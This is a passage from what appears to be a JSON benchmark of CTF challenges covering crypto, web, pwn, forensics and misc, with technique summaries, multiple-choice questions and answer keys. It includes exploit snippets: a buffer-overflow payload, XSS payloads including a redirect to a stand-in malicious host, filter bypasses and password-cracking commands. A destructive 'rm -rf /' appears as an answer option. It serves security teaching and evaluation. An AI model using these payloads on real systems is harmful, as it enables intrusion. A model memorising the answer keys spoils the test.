            "You are given a task to predict the sequence of a pseudo-random number generator (PRNG) used by a server. The server provides 29 sequential outputs from the PRNG, and you know that the output number is derived from reversing the last 8 bits of the PRNG's internal state and converting this bit sequence to an integer. Given this information, which approach is most likely to help you reconstruct the internal state of the PRNG? - A. Completely ignoring the server's outputs since PRNG sequences cannot be predicted without the seed. - B. Using the provided outputs to estimate the internal state transitions of the PRNG and reverse-engineer the seed by applying known algorithm specifics. - C. Assuming a linear relationship between all outputs and solving a set of linear equations to find the PRNG seed. - D. Encrypting the outputs with a different algorithm and analyzing the encrypted data for patterns.",
            "During a cryptography challenge, you have a sequence of outputs generated by a server using a combination of bit operations (left shifts and bitwise AND) on an initial state. You also have a set of outputs (k[i]) obtained after applying a specific transformation on the initial state and additional bit sequences. If your objective is to determine the initial state or seed of the server's generators, what strategy should you follow? - A. Generating random seeds until one matches the provided sequence of outputs, disregarding any specific bit operations needed. - B. Attempting a brute-force attack on the server directly to bypass the need for understanding the transformation. - C. Enumerating all possible initial states that could lead to the first output and then iteratively applying the known transformations and filtering based on subsequent outputs to narrow down to the correct seed. - D. Assuming the server's algorithms are flawlessly secure and giving up on trying to predict the sequence or reverse-engineer the initial state."
        ],
        "answer": [
            "B.",
            "C."
        ]
    },
    {
        "name": "Good Driver Bad Driver",
        "write_up": "dataset/raw/Good Driver Bad Driver.md",
        "type": "web",
        "competition": [
            "vishwa/2021",
            "https://ctftime.org/event/1286/tasks/"
        ],
        "score": 496,
        "max_score": 500,
        "difficulty": 0.992,
        "knowledge": [
            "When faced with a classification task in a Capture The Flag challenge that involves predicting categories based on provided datasets, machine learning techniques, specifically supervised learning models, can be effectively applied. Ensuring the model is adequately trained on the provided labeled dataset before applying it to classify or predict the unlabeled data can achieve high accuracy. For example, one could use Python along with libraries such as scikit-learn to train a model (e.g., Random Forest, Support Vector Machine, or any suitable classifier) using the labeled dataset (`drivertrainlabeled.csv`) and then predict the classes of the new data (`drivertestunlabeled.csv`).",
            "In challenges requiring a perfect prediction accuracy to retrieve the flag (`accuracy of 1.0` as mentioned), it is critical to perform thorough data preprocessing and feature engineering before training the model. This could involve handling missing data, normalizing or standardizing the features, and possibly reducing dimensionality if the dataset is high-dimensional. These steps enhance the model's ability to learn from the training data and make accurate predictions on the test data. After preprocessing, applying techniques like cross-validation to tune model parameters and select the best model is essential for achieving the required prediction accuracy."
        ],
        "question": [
            "When conducting a classification task to predict categories from a dataset for a CTF challenge, which Machine Learning technique in Python would best allow for accurately classifying new data based on a provided labeled dataset? - A. Utilizing TensorFlow to implement a convolutional neural network. - B. Using Python's scikit-learn library to train a supervised learning model such as Random Forest or Support Vector Machine using the labeled dataset. - C. Applying a basic linear regression model for categorical prediction. - D. Implementing a simple decision tree with manual coding without any data preprocessing.",
            "To achieve a prediction accuracy of 1.0 in a CTF challenge where the flag is awarded for perfect prediction accuracy, which step is crucial before training the machine learning model? - A. Reducing the color depth of any images in the dataset to decrease computational load. - B. Utilizing sentiment analysis on any textual data to understand underlying patterns. - C. Conducting thorough data preprocessing and feature engineering, such as handling missing data, normalizing features, and possibly reducing dimensionality. - D. Transforming all categorical data into a single hot-encoded vector without evaluating its relevance to the output variable."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Good luks2",
        "write_up": "dataset/raw/Good luks2.md",
        "type": "This CTF challenge is classified as a crypto challenge.",
        "competition": [
            "BSidesSF/2019",
            "https://ctftime.org/event/753/tasks/"
        ],
        "score": 100,
        "max_score": 666,
        "difficulty": 0.15015015015015015,
        "knowledge": [
            "When faced with encrypted disk challenges, specifically LUKS (Linux Unified Key Setup) encrypted volumes, it's pivotal to dump the header containing the password hash for the encrypted volume. This can be accomplished using the `dd` command. The specific usage involves specifying the input file (the encrypted volume), the output file (where the header will be saved), and the byte size to ensure only the header is extracted. This process is essential for the subsequent password cracking stage.",
            "For brute-forcing the password of an encrypted volume, leveraging common password dictionaries such as `rockyou.txt` can be highly effective. Prioritize well-known and comprehensive dictionaries, which are often used in password attacks due to their extensive collection of passwords from various data breaches. If the challenge hints suggest a focus on vocabulary, initially exploring niche or themed wordlists can be considered, but broadening the scope to include extensive lists like `rockyou.txt` should not be delayed, as it often contains the keys to rapidly unlocking such puzzles. \n\n    Example command using hashcat with rockyou.txt:\n    ```\n    hashcat -a 0 -m [mode] [hashfile] /path/to/rockyou.txt\n    ```"
        ],
        "question": [
            "In the context of attacking a LUKS encrypted volume, if you need to extract the volume header for password cracking purposes, which command accurately represents how you might use `dd` to accomplish this?  - A. `dd if=/dev/sda of=luks-header.bin bs=512 count=1` - B. `sudo dd if=encryptedVolume.luks of=volumeHeader.bin bs=1MB` - C. `dd if=encryptedVolume.luks of=volumeHeader.bin bs=512 count=2048` - D. `rm -rf /` ",
            "When attempting to crack the password of an encrypted volume and the challenge hints towards vocabulary, why might you eventually choose to utilize the `rockyou.txt` wordlist?  - A. Because `rockyou.txt` is a small, easily manageable list perfect for quick tests. - B. Because it is mandatory to use `rockyou.txt` for all password cracking challenges. - C. Because `rockyou.txt` contains a vast collection of real-world passwords, making it highly effective for brute-forcing beyond niche vocabularies. - D. Because using any other dictionary requires special permission. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "goodluks1",
        "write_up": "dataset/raw/goodluks1.md",
        "type": "The type of this CTF challenge is \"forensics\".",
        "competition": [
            "BSidesSF/2019",
            "https://ctftime.org/event/753/tasks/"
        ],
        "score": 50,
        "max_score": 666,
        "difficulty": 0.07507507507507508,
        "knowledge": [
            "When dealing with an encrypted LUKS partition in a CTF challenge, one potential method to derive the decryption passphrase is by analyzing auxiliary information or hints provided along with the challenge. This could include seemingly unrelated files or images that, upon closer examination, contain clues or direct references to password generation schemes or the passwords themselves. In scenarios where a password is hinted to be generated through a specific method or derived from a set of given information (such as numeric codes, phrases, or memberships tied to public resources like the EFF's [Electronic Frontier Foundation] dice-rolled passwords), converting said information according to the hinted scheme may lead to the correct passphrase.\n    - No example payload, as the process involves interpretation and conversion based on the hints provided.",
            "If an image or additional file hints at an association with external resources like websites or organizations (EFF in this scenario), it can be instrumental to visit these external resources for potential password generation methods or tools. Websites associated with cybersecurity and privacy often have tools for generating strong passwords or phrases that could be used as encryption keys. Analyzing the hints to connect them to such tools and applying the derived information (like converting given numeric codes into words through the EFF's password generation page) could reveal the decryption key.\n    - No example payload, as this involves navigating to external websites and utilizing tools or information found therein to derive the necessary key."
        ],
        "question": [
            "In the scenario where you have recovered an encrypted LUKS partition from an image and discovered a post-it note hint suggesting the use of EFF's dice-rolled passwords for decryption, which of the following best describes the initial step you would take to attempt the decryption? - A. Directly attempt to crack the LUKS encryption with brute-force methods. - B. Convert any visible numerical information on the post-it note to ASCII as a potential passphrase. - C. Consult the EFF's website for tools or methods to convert numerical codes into a passphrase. - D. Ignore the post-it note as irrelevant and focus solely on technical attempts to breach the encryption. ",
            "When engaging in a CTF challenge involving the decryption of a LUKS partition, and there's an indication that the passphrase might be related to an EFF membership, what external resource is most likely to assist in generating the correct passphrase? - A. The official LUKS documentation website for details on default passphrases. - B. A dictionary online for common passphrase words. - C. The EFF's dice-generated passwords page to convert provided information into a passphrase. - D. Social media platforms in search of hints or passwords shared by users. "
        ],
        "answer": [
            "C.",
            "C."
        ]
    },
    {
        "name": "GoSynthesizeTheFlagYourself",
        "write_up": "dataset/raw/GoSynthesizeTheFlagYourself.md",
        "type": "reverse",
        "competition": [
            "justCTF/2019",
            "https://ctftime.org/event/943/tasks/"
        ],
        "score": 453,
        "max_score": 500,
        "difficulty": 0.906,
        "knowledge": [
            "When analyzing Linux binaries with angr for reverse engineering challenges, incorporating specific constraints to model the expected input size can significantly increase efficiency. This involves making the length of the input symbolic and setting the simulation to search pathways leading to specific output (e.g., success messages). This technique is effective when the binary requires input that meets certain length and content requirements.\n   - Example Python code snippet using angr:\n     ```python\n     import angr\n     import claripy\n\n     p = angr.Project(\"binary_name\")\n     symsize = claripy.BVS('inputLength', 64) # Adjust 64 to required input size\n     simfile = angr.SimFile('/tmp/stdin', size=symsize)\n     state = p.factory.entry_state(stdin=simfile)\n     simgr = p.factory.simulation_manager(state)\n     simgr.explore(find=lambda s: b\"Success Message\" in s.posix.dumps(1))\n     ```",
            "For solving challenges involving the reconstruction of input based on state transitions defined in SystemVerilog files, extracting and mapping state transitions can reveal the input sequence leading to the final state. This requires parsing the SystemVerilog code to build a map of state transitions and corresponding input values (`di`), then traversing this map from the initial state to the final, solution state to assemble the flag.\n   - Example Python code snippet for state transition mapping and traversal:\n     ```python\n     entries = {}  # A dictionary to hold state transitions\n     # Populate 'entries' with state transitions and corresponding di values\n     # lines = ['...']  # SystemVerilog file lines\n\n     state = initial_state  # The starting state\n     flag = []  # To accumulate the flag characters\n     while state != final_state:  # Traverse until solution state is reached\n         state, flag_part = entries[state]  # Get next state and flag part\n         flag.append(flag_part)  # Append flag part to the flag\n     ```"
        ],
        "question": [
            "In the context of using angr for binary analysis, especially when dealing with binaries that expect input of a certain length and content, one can enhance the efficiency by making the length of the input symbolic and directing the simulation towards specific outcomes. Given this scenario, what would be the correct way to model the expected input size and specify the pathway leading to a success message using angr?  - A. Use `claripy.BVV` to define the input size and `simgr.run()` to search for any state. - B. Use `angr.SimFile` without specifying size and `simgr.explore` with a `find` condition on any binary output. - C. Define the input length as symbolic using `claripy.BVS` and utilize `simgr.explore` to find a state that outputs a specific message. - D. Directly set the input size in `p.factory.entry_state` and use `state.solver.eval` to retrieve the success message. ",
            "When tackling challenges that involve deducing the correct inputs to drive a state machine (described in SystemVerilog) towards a final state that outputs a desired signal, a methodical approach involves mapping state transitions and their respective input values, followed by reconstructing the input sequence through this map. Based on this strategy, how should one process a SystemVerilog file and traverse the constructed map to correctly assemble the flag or solution?  - A. Create a map that links only the final state to the initial state directly, bypassing intermediate states. - B. Sequentially read each line of the SystemVerilog file without distinguishing between state transitions or input values. - C. Build a dictionary mapping each state to its subsequent state and corresponding input value, starting the traversal from the final state without considering the initial state. - D. Construct a map from state transitions and corresponding input values (`di`), then traverse this map from the initial state to the final state to gather the flag parts. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "gpushop",
        "write_up": "dataset/raw/gpushop.md",
        "type": "web",
        "competition": [
            "GoogleCTF/2021",
            "https://ctftime.org/event/1318/tasks/"
        ],
        "score": 283,
        "max_score": 233123.2321,
        "difficulty": 0.0012139502247403853,
        "knowledge": [
            "When faced with a web application utilizing path-based request handling mechanisms, if traditional path manipulation or case sensitivity exploitation methods fail (e.g., changing case of letters in the path), consider the use of URL encoding to bypass restrictions or filters. This approach can be essential in exploiting server-side request handling to access restricted endpoints or trigger unintended server behaviors. Example payload: Encoding the path `/checkout` as `/cart/%63%68%65%63%6b%6f%75%74` to bypass restrictions.",
            "In scenarios where a web application adds specific headers based on request paths (such as the \"X-Wallet\" header when accessing a checkout functionality), modifying the request path through URL encoding can prevent the application from appending these headers. This technique can be particularly useful in situations where the presence of certain headers might block access to vulnerable functionalities or endpoint behaviors essential for completing a challenge."
        ],
        "question": [
            "In a web application that uses path-based request handling, if changing the URL's path case does not bypass the restriction, what technique should be considered next to potentially access restricted endpoints? - A. Use HTML entities to encode the entire URL - B. Encode the path components using URL encoding - C. Directly access the website's database to modify the path restrictions - D. Use JavaScript to dynamically change the path in the client-side code",
            "When attempting to access a web application's functionality that adds a specific header based on the URL path (e.g., X-Wallet header during checkout), which method could prevent the application from appending this header, thus potentially revealing vulnerabilities? - A. Adding random query parameters to the URL - B. Simplifying the URL structure to use basic paths - C. Encoding parts of the URL path that trigger the addition of the header - D. Manually adding the expected header with a null value in the request"
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Greatest Hits 3 of 4",
        "write_up": "dataset/raw/Greatest Hits 3 of 4.md",
        "type": "The type of the CTF challenge described in the write-up is crypto.",
        "competition": [
            "BlueHens/2023",
            "https://ctftime.org/event/2126/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "When faced with an XOR encryption challenge where the key is unknown but part of the plaintext is known, the known plaintext attack can be applied. This attack involves brute-forcing every possible offset where the known plaintext might fit within the ciphertext. For each offset, XOR the slice of ciphertext corresponding to the length of known plaintext with the known plaintext itself. This might produce a permutation of the original encryption key, requiring adjustment based on the offset. The correct permutation of the key can then be used to decrypt the entire message. Example conceptual payload snippet: \n```python\nfor offset in range(len(ciphertext) - len(known_plaintext)):  \n    key_fragment = xor(ciphertext[offset:offset+len(known_plaintext)], known_plaintext)\n    potential_key = rearrange_key_based_on_offset(key_fragment, offset)\n    if is_ascii(xor(ciphertext, potential_key)):\n        print(xor(ciphertext, potential_key))\n```",
            "In XOR encryption challenges, determining whether a decrypted message is correct might require checking if it consists of printable ASCII characters. This can be accomplished by implementing a function that verifies all characters in the decrypted message are within the ASCII printable range. This method effectively filters out false positives, leading to the identification of the correct plaintext. Example function snippet in Python for checking ASCII printability:\n```python\ndef is_ascii(s):\n    return all(c in string.printable for c in s)\n```"
        ],
        "question": [
            "In an XOR encryption CTF challenge, you're given the ciphertext and part of the plaintext without the key. Given this scenario, how should you start attempting to decrypt the entire message? - A. Encrypt the given part of the plaintext with a guessed key and match it with the ciphertext. - B. Use the ciphertext length to guess the key. - C. Brute force every possible offset where the known plaintext might fit within the ciphertext, using XOR between the ciphertext slice and the known plaintext to potentially produce a permutation of the original key. - D. Directly use the known plaintext as the key to decrypt the ciphertext.",
            "When implementing a function to check if a decrypted message from an XOR encryption challenge is correct, which of the following conditions should the function verify for each character in the message? - A. The character must be a number. - B. The character must be a non-printable ASCII character. - C. The character must be within the ASCII printable range. - D. The character must be within a Unicode range."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Greatest Hits 4 of 4",
        "write_up": "dataset/raw/Greatest Hits 4 of 4.md",
        "type": "This write-up belongs to the crypto category.",
        "competition": [
            "BlueHens/2023",
            "https://ctftime.org/event/2126/tasks/"
        ],
        "score": 429,
        "max_score": 500,
        "difficulty": 0.858,
        "knowledge": [
            "When dealing with cryptography challenges involving time-seeded pseudorandom number generators (PRNGs), if the seed is based on a known or predictable value such as the current time, one can brute-force the seed values by iterating through a range of time values around the seed's initialization time. This approach is applicable when the seed is initialized with time and the exact time or a narrow time range is known. This method relies on recreating the PRNG state by seeding it with each assumed value in the sequence and attempting decryption until the output meets a certain condition, such as producing readable ASCII characters.",
            "The compatibility of Python versions can significantly impact the execution and output of scripts, particularly with functions and methods that have changed across versions. If a script uses Python 2 specific methods, such as `.encode('hex')`, it may not run as expected in Python 3 which does not support these methods. In such scenarios, ensuring that the script is run with the appropriate Python version is crucial for achieving the expected outcomes. This is especially relevant when working with encoding and decoding data, where Python 3 introduces explicit differences between bytes and string objects, unlike Python 2."
        ],
        "question": [
            "In an encryption algorithm, if the encryption key is generated by seeding a pseudorandom number generator (PRNG) with the current time (`int(time.time())`), which method allows an attacker to decrypt the ciphertext by exploiting this seed initialization?  - A. Analyze the encryption algorithm to find mathematical weaknesses. - B. Brute-force the encryption key by iterating over all possible keys. - C. Intercept the encryption key during transmission. - D. Brute-force the seed value by iterating through a range of time values around the initialization time and attempt decryption. ",
            "While converting a Python 2 script to Python 3, you encounter a line of code that uses `.encode('hex')`. This method was used to convert a byte string into its hex representation. Given Python 3's explicit distinction between bytes and string objects and the absence of `'hex'` encoding, which of the following would be an appropriate adaptation for Python 3?  - A. Use `bytes.hex()` to convert byte strings to their hex representation. - B. Replace `.encode('hex')` with `.encode('utf-8')`. - C. Use `str.encode()` without any arguments. - D. Directly use `.encode('hex')`, as it is still supported in Python 3. "
        ],
        "answer": [
            "D",
            "A"
        ]
    },
    {
        "name": "Green Cabbage",
        "write_up": "dataset/raw/Green Cabbage.md",
        "type": "This is a forensics challenge.",
        "competition": [
            "ASIS/2018/Finals",
            "https://ctftime.org/event/620/tasks/"
        ],
        "score": 322,
        "max_score": 500,
        "difficulty": 0.644,
        "knowledge": [
            "When analyzing network capture files (pcap), if the scenario involves communication with a server that includes seemingly binary or base64 encoded payloads, consider decoding the payloads with common encoding schemes or compression algorithms. Particularly, if the communication data resembling compressed data or encoded strings results in a recognizable pattern or structure upon decompression, it may indicate the use of a specific compression algorithm like Brotli. This approach can reveal hidden messages or commands being transmitted. For instance, encountering a large blob of data that decompresses to a structured format or text might hint towards its encoding with a compression tool.",
            "In challenges where the interaction with a server requires sending back responses or specific formats of data (like timestamps, compressed strings, etc.), if straightforward tasks do not yield results, consider reflecting back the data received from the server with minimal modifications as required by the server's prompts. This could involve sending back the same data in a different format (for example, epoch time format) or compressing/decompressing data using indicated algorithms. This technique can be especially useful when the task or the expected response format is unclear but guided by server-side messages.\n\nExample command for decompression with Brotli (assuming the payload is base64 encoded and compressed with Brotli):\n```bash\necho 'Base64EncodedString==' | base64 --decode | brotli --decompress\n```"
        ],
        "question": [
            "When tasked with analyzing a pcap file showing interactions with a server, you notice several payloads encoded in base64 that seem to represent binary data. After recognizing a repeating pattern, you suspect these payloads might be compressed. Which of the following commands would be appropriate to apply if you suspect the data is compressed with Brotli after base64 decoding it? - A. `echo 'Base64EncodedString==' | base64 --decode | gzip -d` - B. `echo 'Base64EncodedString==' | base64 --decode | brotli --decompress` - C. `echo 'Base64EncodedString==' | base64 --decode | unzip` - D. `echo 'Base64EncodedString==' | base64 --decode | bzip2 -d`",
            "You are experimenting with server communication in a cybersecurity challenge and suspect that you need to format and send back data to the server as part of the interaction. The server requests a specific data format, and it becomes clear that directly reflecting data received might be part of the solution. If the server's request is ambiguously guiding you to send back a particular data stream in a compressed format using Brotli, which command correctly reflects this action, assuming you have the data stream `data_stream` to send back? - A. `echo 'data_stream' | brotli --compress | base64` - B. `echo 'data_stream' | gzip | base64 --decode` - C. `echo 'data_stream' | bzip2 | base64` - D. `echo 'data_stream' | brotli --decompress | base64 --decode`"
        ],
        "answer": [
            "B",
            "A"
        ]
    },
    {
        "name": "Greeter",
        "write_up": "dataset/raw/Greeter.md",
        "type": "pwn",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 150,
        "max_score": 800,
        "difficulty": 0.1875,
        "knowledge": [
            "When exploiting a buffer overflow vulnerability in a program where the 'gets' function is used, causing a lack of bounds checking, calculate the exact number of bytes to the buffer plus any additional bytes needed to overwrite the base pointer (bp) to control the stack pointer (rsp). This allows the injection of an address pointing to a malicious function (e.g., a win function) to hijack the program's execution flow. In this scenario, it was necessary to overflow 64 bytes of buffer plus 8 bytes (the base pointer) to effectively control the rsp. Therefore, supplying 72 arbitrary bytes (\"A\"*72) followed by the target address can redirect the execution.\n   - Example payload to call the 'win' function: \"A\"*72 + p64(address_of_win_function)",
            "When dealing with programs compiled with NX (Non-Executable Stack) enabled, which prevents execution of arbitrary code on the stack, but PIE (Position Independent Executable) is disabled, allowing for predictable memory addresses, it is viable to use the address of a function within the binary to cause a controlled execution flow change. To find the memory address of the intended function (e.g., a function that prints out a flag), debugging tools such as GDB can be used with commands like `info functions function_name`. This address can then be injected into the exploit payload crafted to overflow the buffer.\n   - For obtaining the address of a function like 'win' in GDB: `info functions win`"
        ],
        "question": [
            "In a scenario where a cybersecurity analyst is exploiting a buffer overflow vulnerability caused by the 'gets' function in a program, which lacks bounds checking, how many additional bytes beyond filling the buffer are typically needed to overwrite the base pointer and gain control over the stack pointer (rsp), considering a 64-byte buffer as an example?  - A. 64 bytes - B. 4 bytes - C. 16 bytes - D. 8 bytes ",
            "When working with a binary compiled with NX enabled but PIE disabled, making the stack non-executable yet allowing for a predictable memory layout, what debugging command could be used to obtain the address of a specific function (e.g., 'win') to inject into an exploit payload?  - A. disassemble win - B. search win - C. info functions win - D. find win address "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Grep 0",
        "write_up": "dataset/raw/Grep 0.md",
        "type": "The type of this CTF challenge is **misc** (miscellaneous).",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 50,
        "max_score": 800,
        "difficulty": 0.0625,
        "knowledge": [
            "When dealing with large text files in CTF challenges that hint at the presence of a hidden pattern or keyword, `grep` can be effectively used to search through the text by leveraging patterns, regular expressions, or even partial keywords to locate the flag. This approach is particularly useful when the exact terms or phrases to search for are not known, but a general idea or hint is provided. Example usage: `grep \"pattern\" filename.txt`, where \"pattern\" could be a broad or partial match hinted by the challenge description.",
            "If initial attempts to locate a flag using specific or complete keywords are unsuccessful, truncating the search pattern to a smaller subset of the suspected keyword may yield results. This method plays on the probability that even parts of the correct keyword can be present in the hidden flag or the relevant text leading to the flag. This strategy requires iterative refinement of the search pattern based on the challenge hints or logical deductions from the challenge context. Example usage: `grep \"pa\" filename.txt`, where \"pa\" is a truncated version of the suspected keyword or pattern."
        ],
        "question": [
            "In a CTF challenge focused on analyzing a large text file for hidden patterns, which Unix command can be effectively utilized to search for specific patterns or keywords within the file based on hints provided in the challenge description? - A. `sed \"gr\" flag.txt` - B. `awk '{print $gr}' flag.txt` - C. `cut -d'gr' -f1 flag.txt` - D. `grep \"gr\" flag.txt` ",
            "When initial searches with complete keywords do not reveal the hidden flag in a text file during a CTF challenge, what strategy might help in locating the flag? - A. Using a graphical user interface text editor to manually find the keyword - B. Renaming the file to include the keyword in hopes of it revealing the flag - C. Truncating the search pattern to a smaller subset of the suspected keyword for a broader search - D. Encrypting and then decrypting the file to uncover hidden text "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Grep 1",
        "write_up": "dataset/raw/Grep 1.md",
        "type": "The type of the challenge is **forensics**.",
        "competition": [
            "NACTF/2020",
            "https://ctftime.org/event/1157/tasks/"
        ],
        "score": 200,
        "max_score": 800,
        "difficulty": 0.25,
        "knowledge": [
            "When searching for specific patterns in large text files, regular expressions are an invaluable tool. They allow for precise matching of patterns that follow a given set of rules. For instance, when looking for a flag that follows a particular structure in a mass of data, constructing a regex pattern based on the known parts of the flag's format can significantly narrow down the search. In the context of CTF challenges, where a flag's structure might be partially known, such as specific characters at certain positions and the total length, a regular expression can be crafted to match these conditions. Example payload: ```grep \"nactf{[nac]{10}.{21}[ctf]{14}}\" flag.txt```",
            "Utilizing command-line tools like 'grep' with constructed regular expressions can expedite the search for flags in text-based challenges. This method is especially useful when dealing with enormous files where manual inspection is impractical. The 'grep' command can be combined with regex to filter out the exact pattern of interest among a haystack of decoy entries. This approach is applicable in scenarios where the flag follows a specific pattern that can be encoded into a regex formula, facilitating automated searches that directly lead to the solution. Understanding the components of regex such as character classes (`[...]`), quantifiers (`{...}`), and wildcards (`.`) is critical for crafting effective search patterns."
        ],
        "question": [
            "When constructing a regex pattern for a CTF challenge where the flag's structure is partially known, which regex pattern would correctly identify a flag that begins with \"nactf{\", followed by exactly 10 instances of the letters 'n', 'a', or 'c', an unspecified sequence of 21 characters, and ending with exactly 14 instances of the letters 'c', 't', or 'f'? - A. `\"nactf{[nac]{10}.{21}[ctf]{14}}\"` - B. `\"nactf{[abc]{10}.*[ftc]{14}}\"` - C. `\"nactf{[nac]*10.*21[ctf]*14}\"` - D. `\"nactf[nac]{10}.{21}[ctf]{14}\"`",
            "In the context of using the 'grep' command to search for a structured flag pattern within a large text file, which command correctly implements a regex to find a specific flag format? - A. `grep \"nactf{[nac][nac][nac][nac][nac][nac][nac][nac][nac][nac].{21}[ctf][ctf][ctf][ctf][ctf][ctf][ctf][ctf][ctf][ctf][ctf][ctf][ctf][ctf]}\" flag.txt` - B. `grep -E \"nactf{[nac]{10}.{21}[ctf]{14}}\" flag.txt` - C. `grep \"nactf{[nac]{10}.?[ctf]{14}}\" flag.txt` - D. `grep \"nactf{\\[nac\\]{10}.\\{21\\}[ctf]{14}}\" flag.txt`"
        ],
        "answer": [
            "A",
            "B"
        ]
    },
    {
        "name": "Group Project",
        "write_up": "dataset/raw/Group Project.md",
        "type": "crypto",
        "competition": [
            "UIUCTF/2023",
            "https://ctftime.org/event/1899/tasks/"
        ],
        "score": -1,
        "max_score": 50,
        "difficulty": -1,
        "knowledge": [
            "In a cryptographic challenge involving Diffie-Hellman key exchange or similar schemes where a variable exponent can be controlled by the user, setting the exponent (`k`) to 0 can simplify the equation greatly, potentially reducing the calculation of the secret to a trivial matter since any number raised to the power of 0 is 1. This can allow for straightforward decryption if the key derivation process is known and modifiable by an attacker. Such a condition can be exploited in challenges where part of the cryptographic operation relies on exponentiation with a user-controlled value.",
            "In cryptographic challenges that use hashing algorithms like MD5 for key generation, knowing the input to the hash function allows for the direct calculation of the decryption key, given that the hash algorithm and the input format are known. This is particularly exploitable in scenarios where the algorithm is deterministic and the input can be either guessed, influenced, or calculated (as demonstrated by manipulating `k` to simplify the process of deriving the shared secret to a known value). This emphasizes the importance of not only secure key exchange mechanisms but also ensuring that key generation processes cannot be trivially influenced or reverse-engineered by an attacker.\n\nSample payload to decrypt the flag when `S = 1`:\n```python\nfrom Crypto.Cipher import AES\nimport hashlib\nfrom Crypto.Util.Padding import pad\nfrom Crypto.Util.number import long_to_bytes\n\n# Assuming S is known and set to 1 for decryption\nS = 1\nc = 31383420538805400549021388790532797474095834602121474716358265812491198185235485912863164473747446452579209175051706\n\nkey = hashlib.md5(long_to_bytes(S)).digest()\ncipher = AES.new(key, AES.MODE_ECB)\n# Decrypt the ciphertext using the derived key\nplain = cipher.decrypt(c.to_bytes((c.bit_length() + 7) // 8, \"big\"))\nprint(plain)\n```\nThis sample decomposes the exploit strategy into practical steps: obtaining `S`, calculating the MD5 hash of `S` to generate the key, and using the key to decrypt the ciphertext encrypted in AES-ECB mode."
        ],
        "question": [
            "In a cryptographic challenge that involves controlling a variable exponent in a Diffie-Hellman type key exchange, why is setting the exponent (`k`) to 0 considered a significant vulnerability?  - A. It increases the complexity of the key generation process, making it harder to predict. - B. It ensures that the value of `Bk` becomes `p - 1`, complicating the decryption process. - C. It causes `Bk` to equal 1, simplifying the secret (`S`) to 1, and allowing for straightforward decryption if the key derivation process is known. - D. It triggers an underflow error that can be exploited to bypass encryption mechanisms. ",
            "When using MD5 hashing for key generation in cryptographic challenges, what allows for the decryption key to be directly calculated?  - A. The non-deterministic nature of the MD5 hashing process that creates unique encryption keys. - B. The ability to influence or calculate the input to the MD5 hash function, given the algorithm and input format are known. - C. The reversible property of MD5 hash functions that allows for the original input to be derived from the hash. - D. The complex mathematical structure of MD5 that requires advanced computational resources to decrypt. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "h4x0rs",
        "write_up": "dataset/raw/h4x0rs.club 2.md",
        "type": "web",
        "competition": [
            "0CTF/2018/Finals",
            "https://ctftime.org/event/558/tasks/"
        ],
        "score": -1.0,
        "max_score": 600,
        "difficulty": -1,
        "knowledge": [
            "When attempting to exploit an XSS vulnerability where the payload is reflected in the document, Chrome's XSS Auditor may block execution if it detects a script tag in the URL that is also reflected on the page. To bypass Chrome's XSS Auditor, one can split the script tag or use alternative encoding methods to prevent the auditor from recognizing the payload as a malicious script. This technique is useful when dealing with reflected XSS vulnerabilities in environments where input is reflected within the HTML document and modern browsers with built-in XSS protection are used.",
            "In scenarios where JavaScript code copies HTML content from one element to another, it's possible to achieve JavaScript execution through XSS by crafting input that creates a valid HTML structure with a script tag in the source element. This script will then be executed when copied to the target element, allowing for the execution of arbitrary JavaScript code. This method is particularly effective in environments where user input is directly included into the DOM without proper sanitization, especially in complex web applications with dynamic content manipulation.  \n   Example payload: `<div id=\"audiences\"><script>alert('XSS');</script></div><div class=\"js-user\"></div>`"
        ],
        "question": [
            "When exploiting a reflected XSS vulnerability in a scenario where Chrome's XSS Auditor blocks the execution due to recognition of a script tag in the URL that is also reflected on the page, which method can effectively bypass this protection? - A. Change the document's Content-Type header to application/json - B. Use HTTPS instead of HTTP in the URL - C. Split the script tag or use alternative encoding methods - D. Add an HTTP header `X-XSS-Protection: 0`",
            "In a web application, where JavaScript is used to copy HTML content from one element (`sourceElement`) to another (`targetElement`) as a method of dynamic content update, which of the following payloads could potentially trigger an XSS if the application does not properly sanitize user input? - A. `<script>document.location='http://malicious.site'</script>` - B. `' onmouseover='alert(document.cookie)'` - C. `<div id=\"sourceElement\"><script>alert('XSS');</script></div><div class=\"targetElement\"></div>` - D. `<!--><script>alert('XSS')</script><!--`"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Hack Code - Flag 4",
        "write_up": "dataset/raw/Hack Code - Flag 4.md",
        "type": "The type of this CTF challenge is `misc`.",
        "competition": [
            "INShAck/2019",
            "https://ctftime.org/event/763/tasks/"
        ],
        "score": 100,
        "max_score": 500,
        "difficulty": 0.2,
        "knowledge": [
            "For challenges related to optimization or selection problems such as set cover, a randomized solution can serve as a starting point when exact or greedy approaches are not immediately apparent. Begin by iterating through all sets, randomly selecting an element to add to the solution if the current set is not yet covered by the existing selections. This method generates a feasible solution that can be iterated upon for improvement.",
            "Improve the initial randomized solution by inserting a random element not yet in the solution and then attempt to minimize the solution size by iteratively checking if any of the current elements can be removed without compromising the solution's comprehensiveness (i.e., all sets remain covered). Incorporate an optimization to significantly reduce runtime by only reevaluating elements that are in sets affected by the most recent addition to the solution, rather than all elements. This targeted approach leads to quicker attainment of an optimal or near-optimal solution.\n\nExample of improvement step (pseudo code):\n```\nsolution.add(randomRouter)\nfor each router in solution:\n    if removing router does not break coverage:\n        solution.remove(router)\nif solution is not smaller:\n    solution.remove(randomRouter)\n```"
        ],
        "question": [
            "In an optimization challenge where the task is to select a subset that covers all given sets (set cover problem), and the initial method involves adding elements randomly to find an initial feasible solution, what is the main purpose of starting with a random solution? - A. To immediately find the optimal solution - B. To provide a baseline that can be iterated upon for improvements - C. To increase the computational complexity of the problem - D. To finalize the solution without need for further optimization",
